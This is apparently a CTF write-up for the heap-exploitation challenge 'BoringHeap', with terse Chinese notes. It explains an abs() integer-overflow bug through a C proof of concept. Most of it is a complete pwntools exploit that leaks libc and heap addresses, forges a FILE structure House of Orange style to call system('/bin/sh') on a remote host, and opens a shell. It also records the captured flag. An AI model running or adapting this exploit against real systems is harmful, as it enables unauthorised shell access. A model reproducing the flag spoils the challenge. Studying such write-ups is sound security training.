# BoringHeap

abs 处对`-0x80000000`有问题
Poc:

```c
#include<stdio.h>
int main()
{
	for(int i=1;i!=0;i++)
	{
		int tmp=abs(i)%0x30;
		if(tmp>=0x30||tmp<0)
		{	printf("%d\n",tmp);
			printf("%d\n",i);}
	}
}
```

可以向低地址越界写 one_gadget 不太好搞 orange 拿 shell

```python
from pwn import *
def cmd(c):
	p.sendlineafter("it\n",str(c))
def add(size,c='A\n'):
	cmd(1)
	if size==0x20:
		t=1
	elif size==0x30:
		t=2
	else:
		t=3
	p.sendlineafter("ge\n",str(t))
	p.sendafter(":\n",c)
def edit(idx,off,c):
	cmd(2)
	p.sendlineafter("?\n",str(idx))
	p.sendlineafter("?\n",str(off))
	p.sendafter(":\n",c)
def show(idx):
	cmd(4)
	p.sendlineafter("?\n",str(idx))
def free(idx):
	cmd(3)
	p.sendlineafter("?\n",str(idx))
context.log_level='debug'
context.arch='amd64'
libc=ELF("./libc.so")
p=remote("8sdafgh.gamectf.com",10001)
#p=process('./pwn',env={"LD_PRELOAD":'./libc.so'})
add(0x30)#0
add(0x30)#1
add(0x40,p64(0x21)*8)#2
add(0x40,p64(0x21)*8)#3
add(0x40,p64(0x21)*8)#4
edit(1,-0x80000000,'\x00'*0x18+p64(0x91)+'\n')
free(1)

add(0x30,"\n")#5
show(5)

base=u64(p.read(6).ljust(0x8,'\x00'))-(0x7f1767630b0a-0x7f176726c000)

log.warning(hex(base))
#gdb.attach(p)
add(0x30,p64(0)+p64(0x91)+'\n')#6
libc.address=base
add(0x20)#7
add(0x20)#8
free(8)
free(7)
add(0x20,"\n")#9
show(9)
heap=u64((p.read(6)).ljust(0x8,'\x00'))-(0x55555575710a-0x555555757000)
log.warning(hex(heap))

fio=heap+0x210
fake = "/bin/sh\x00"+p64(0x61)+p64(libc.symbols['system'])+p64(libc.symbols['_IO_list_all']-0x10)+p64(0)+p64(1)
fake =fake.ljust(0xa0,'\x00')+p64(fio+0x8)
fake =fake.ljust(0xc0,'\x00')+p64(1)
fake = fake.ljust(0xd8, '\x00')+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])
add(0x30)#10
add(0x30)#11
add(0x30,p64(0x21)*6)#12
add(0x30,'\x00'*0x30)#13
add(0x30,'\x00'*0x30)#14
edit(10,-0x80000000,'\x00'*0x18+p64(0xa1)+'\n')
free(10)
add(0x30)#15
edit(11,-0x80000000,'\x00'*0x10+fake[:0x40])
edit(12,0,'\x00'*0x30)
edit(13,0,'\x00'*0x10+p64(fio+0x8)+'\x00'*0x18)
edit(14,-0x80000000,'\x00'*0x10+p64(1)+p64(0)*2+p64(fio+0xd8-0x10)+p64(libc.symbols['system'])+'\n')

#gdb.attach(p,'b _IO_flush_all_lockp')
cmd(1)
p.sendlineafter("ge\n",str(3))
#free(2)
#0x7ffff7a52390
#0x7ffff7a52390
p.interactive('n132>')
#flag{5025ce5ba5cbf7bfed4b2f48ace37c57}
```
